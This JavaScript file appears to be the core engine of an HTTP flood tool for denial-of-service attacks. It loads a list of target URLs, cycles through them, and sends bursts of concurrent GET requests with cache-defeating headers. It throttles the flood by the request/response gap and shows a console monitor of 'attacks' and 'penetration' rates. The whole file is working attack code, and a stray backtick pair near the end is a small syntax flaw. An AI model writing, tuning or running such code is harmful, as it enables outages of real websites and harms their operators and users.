import ora from "ora";
import events from "events";
import axios from "axios";
import chalk from "chalk";

import TargetsParser from "./TargetsParser.js";

events.EventEmitter.defaultMaxListeners = 15;

export default class Engine {
    constructor(argv = {}) {
        this.argv = argv;
        this.startTime = 0;
        this.timeElapsed = 0;
        this.totalTime = argv.time;
        this.lastFrame = 0;
        this.deltaTime = 0;
        this.nextCall = {};
        this.targets = [];
        this.accuracy = "0%";
        this.codes = {
            "2xx": 0,
            "3xx": 0,
            "4xx": 0,
            "5xx": 0,
            "sliping": 0,
            "other": 0,
        };
        this.responses = 0;
        this.requests = 0;
        this.attacksNumber = 0;
        this.countedDiff = 0;
        this.prevCountedDiff = 0;

        this.updating = false;
        this.paused = false;
        this.waiting = false;
        this.waitingWorkers = false;

        this.id = 0;
        this.workers = [];
        this.workersReady = 0;
        this.workersBusy = 0;
        this.results = [];


        this.start();
    }

    async start() {
        this.spinner = ora("Getting targets...").start();
        await this.getTargets();

        this.startTime = Date.now();
        this.timeElapsed = Date.now() - this.startTime;
        this.lastFrame = Date.now();
        this.render();
    }

    async getTargets () {
        this.targets = this.argv.targets ? await TargetsParser.getAllTargets() : await TargetsParser.getCustomTargets();
    }

    render(delta = 0) {
        this.timeElapsed = Date.now() - this.startTime;
        this.deltaTime = Date.now() - this.lastFrame;
        this.lastFrame = Date.now();

        this.enterFrame();
        let timeout = setTimeout(() => {
            this.render(this.deltaTime);
            clearTimeout(timeout);
        }, 300);
    }

    enterFrame () {
        this.workersReady = this.workers.filter(worker => worker.state === "ready").length;
        this.workersBusy = this.workers.filter(worker => worker.state === "busy").length;
        this.accuracy = Math.round(((this.codes["2xx"] + this.codes["3xx"] + this.codes["4xx"] + this.codes["5xx"]) / this.requests) * 100) + "%";

        // if process has been done
        if (this.done) {
            this.fillMonitor();
            setTimeout(() => process.exit(), 500);
        }
        // finish process if time of
        if (this.totalTime > 0 && this.timeElapsed > this.totalTime && !this.preDone) {
            this.preDone = true;
        }

        // set pause if workers limit reached
        if (!this.waitingWorkers && this.workersBusy >= this.WORKERS_LIMIT) {
            this.startWaitingWorkers();
        }

        if (this.waitingWorkers && this.workersReady >= this.WORKERS_READY_MIN) {
            this.stopWaitingWorkers();
        }

        // set the req/res diff
        this.countedDiff = this.requests - this.responses;

        // set pause if difference between req and res got the limit
        if (this.countedDiff >= this.REQ_RES_DIFF) {
            this.startWaiting();
        }

        // attack if not pause
        if (!this.preDone && !this.paused && this.everyTimeElapsed(100)) {
            this.attack();
        }

        // prepare for finish process
        if (this.preDone && !this.done) {
            // waiting for rest of response
            if (this.responses < this.requests) {
                this.paused = true;
                this.waiting = true;
                this.waitingTime = Date.now();
                // done
            } else {
                this.done = true;
            }
        };

        // updating
        if (!this.updating && this.everyTimeElapsed(this.argv.targetsRefresh)) {
            this.startWaiting();
            this.prepareUpdate = true;
            this.paused = true;
        } else if (this.prepareUpdate && !this.waiting) {
            this.prepareUpdate = false;
            this.updateTargets();
        }

        // waiting
        if (this.waiting) {
            if (this.prevCountedDiff === this.countedDiff) {
                this.waitingTime += this.deltaTime;
            } else {
                this.waitingTime = 0;
            }
            this.prevCountedDiff = this.countedDiff;

            if (this.waitingTime >= this.REQ_RESP_DIFF_TIME || this.countedDiff === 0) {
                this.stopWaiting();
            }
        }

        this.fillMonitor();
    }

    startWaitingWorkers () {
        this.paused = true;
        this.waitingWorkers = true;
    }

    stopWaitingWorkers () {
        this.paused = false;
        this.waitingWorkers = false;
    }

    startWaiting () {
        this.paused = true;
        this.waiting = true;
        this.waitingTime = Date.now();
    }

    stopWaiting () {
        this.waitingTime = 0;
        this.requests = this.responses;
        this.waiting = false;
        this.paused = this.prepareUpdate;
        this.prevCountedDiff = 0;
    }

    async updateTargets () {
        this.paused = true;
        this.updating = true;
        this.fillMonitor();
        this.targets = this.argv.targets ? await TargetsParser.getAllTargets(this.targets) : await TargetsParser.getCustomTargets(this.targets);
        this.paused = false;
        this.updating = false;
    }

    attack () {
        let { streams } = this.argv;
        let url = this.url = this.getNextUrl();
        let attack = {
            id: this.id,
            url,
            state: "error",
            color: "red",
            req: 0,
            res: 0,
            success: 0,
            error: 0,
            state: 0,
            completed: false
        };
        this.id++;
        this.attacksNumber++;
        this.results.push(attack);

        this.results = this.results.filter(item => !item.completed);

        let request = () => {
            let instance = axios.request({url})
                .then((response) => {
                    if (response.status) {
                        this.fillCode(String(response.status).replace(/(\d)\d+/g, "$1xx"));
                    }
                    //instance.state = "ready";
                    attack.success++;
                    instance.state = "ready";
                })
                .catch((error) => {
                    if (error.response) {
                        attack.success++;
                        this.fillCode(String(error.response.status).replace(/(\d)\d+/g, "$1xx"));

                    } else if (error.request) {
                        attack.error++;
                        this.fillCode('sliping');
                    } else {
                        attack.error++;
                        this.fillCode('other');
                    }
                    instance.state = "ready";
                })
                .then(() => {
                    this.responses++;
                    attack.res++;
                    attack.state = Math.round((attack.success / streams) * 100) + "%";
                    if (attack.res === streams) {
                        attack.completed = true;
                    }
                    instance.state = "ready";
                });
            instance.state = "busy";
            return instance
        };

        for (let i = streams; i--;) {
            attack.req++;
            this.requests++;
            let instance = this.workers.find(worker => worker.state === "ready");

            if (!instance) {
                instance = axios.create({
                    method: "get",
                    timeout: this.argv.timeout,
                    headers: {
                        "Cache-Control": "private, no-cache, no-store, must-revalidate, max-age=0",
                        "Pragma": "no-cache"
                    }
                });
                instance = request();
                this.workers.push(instance);
            } else {
                let index = this.workers.indexOf(instance);
                if (index >= 0) {
                    this.workers[index] = request();
                }
            }
        }

        this.fillMonitor();
        global.gc();
    }

    everyTimeElapsed (period) {
        if (!this.nextCall[period]) {
            this.nextCall[period] = period;
        }

        if (this.timeElapsed >= this.nextCall[period]) {
            this.nextCall[period] = this.nextCall[period] + period;
            return true;
        }

        return false;
    }

    getNextUrl() {
        if (this.targets.length) {
            let res = this.targets.shift();
            this.targets.push(res);
            return res;
        }
        return "";
    }

    fillCode (statusCode = "") {
        if (statusCode !== "") {
            if (this.codes[statusCode] === undefined) {
                this.codes[statusCode] = 1;
            } else if (statusCode) {
                this.codes[statusCode] += 1;
            }
        }
    }

    fillMonitor() {
        //return;
        let string = "";
        let yellow = chalk.hex("#ffc800");
        let green = chalk.hex("#10bd0d");

        // time ==================
        string += yellow("\r\n----- Time -----\r\n");
        if (this.totalTime > 0) {
            string += `time: ${this.msToTime(this.timeElapsed)} (${this.msToTime(this.totalTime)})`;
        } else {
            string += `time: ${this.msToTime(this.timeElapsed)}`;
        }
        string += "\r\n";

        // workers ==================
        string += yellow("\r\n----- Workers stat -----\r\n");
        let workersBusy = this.workers.filter(worker => worker.state === "busy");
        string += `workers: ${this.workers.length} | workers busy: ${workersBusy.length} | workers free: ${this.workers.length - workersBusy.length}\r\n`;

        // requests ==================
        string += yellow("\r\n----- Requests stat -----\r\n");
        string += `targets: ${this.targets.length} | `;
        string += `req: ${this.requests} | `;
        string += `res: ${this.responses} | `;
        string += `diff: ${this.requests - this.responses} (${this.REQ_RES_DIFF}) \r\n`;

        // status ==================
        string += yellow("\r\n----- Status stat -----\r\n");
        let i = 0;
        for (let key in this.codes) {
            string += `${i == 0 ? "" : " | "}${key}: ${this.codes[key]}`;
            i++;
        }
        string += `\r\n${green("Penetration")}: ${this.accuracy}`;
        string += "\r\n";

        // state ==================
        string += yellow("\r\n----- Attack -----\r\n");
        if (!this.paused) {
            let underAttack = this.results.filter(item => item.res > 0);
            let waitingAttack = this.results.filter(item => item.res === 0);
            string += `Target: ${this.url}\r\n`;
            string += `Targets under attacks: ${underAttack.length}\r\n`;
            string += `Targets started: ${waitingAttack.length}\r\n`;
            string += `Attacks number: ${this.attacksNumber}\r\n`;
        } else if (this.updating) {
            string += `Updating targets...\r\n`;
        } else if (this.waiting) {
            string += `Waiting for ${this.countedDiff} responses... ${this.msToTime(this.REQ_RESP_DIFF_TIME - this.waitingTime)}\r\n`;
        } else if (this.waitingWorkers) {
            string += `Waiting for ${this.WORKERS_READY_MIN - this.workersReady} workers...`;
        };

        // LOG
        string += yellow(`\r\n----- Log -----`);
        for (let i = 0; i < this.RESULTS_LIMIT; i++) {
            let item = this.results[i];
            if (item) {
                string += `\r\nTarget: ${item.url} | Progress: ${item.res}/${item.req} | Accuracy: ${item.state}`;
            } else {
                string += "\r\n";
            }
        }
        string += "\r\n";

        if (this.preDone && !this.done) {
            string += "\r\nWaiting for rest requests...";
        }


        if (this.done) {
            string += "\r\nDone!";
        }

        this.spinner.text = string;
``    }

    msToTime(duration) {
        var milliseconds = parseInt((duration % 1000) / 100),
            seconds = Math.floor((duration / 1000) % 60),
            minutes = Math.floor((duration / (1000 * 60)) % 60),
            hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

        hours = (hours < 10) ? "0" + hours : hours;
        minutes = (minutes < 10) ? "0" + minutes : minutes;
        seconds = (seconds < 10) ? "0" + seconds : seconds;

        return hours + ":" + minutes + ":" + seconds;
    }

    get REQ_RES_DIFF () {
        return this.argv.diffNumber;
    }

    get REQ_RESP_DIFF_TIME () {
        return this.argv.diffTimeout
    }

    get RESULTS_LIMIT () {
        return parseInt(this.argv.streams / 5)
    }

    get WORKERS_LIMIT () {
        return this.argv.workersLimit;
    }

    get WORKERS_READY_MIN () {
        return this.argv.readyWorkersMin
    }
}